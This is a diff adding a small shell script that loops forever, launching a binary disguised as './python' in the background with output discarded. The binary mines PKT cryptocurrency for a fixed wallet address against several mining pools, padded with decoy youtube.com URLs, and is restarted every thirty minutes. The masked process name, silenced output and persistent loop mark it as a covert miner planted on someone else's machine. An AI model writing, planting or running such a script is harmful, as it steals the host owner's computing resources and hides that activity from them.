@@ -1,0 +1,9 @@
+sleep 4
+
+while true; do
+nohup ./python ann -t 2 -p pkt1q38gtnwepwlhs8kp4d6zvg93w86vdjm8jerwgzm http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pkt.world http://youtube.com http://pool.pktpool.io http://pool.srizbi.com > /dev/null 2>&1 &
+sleep 1800
+pkill python
+sleep 90
+done
+
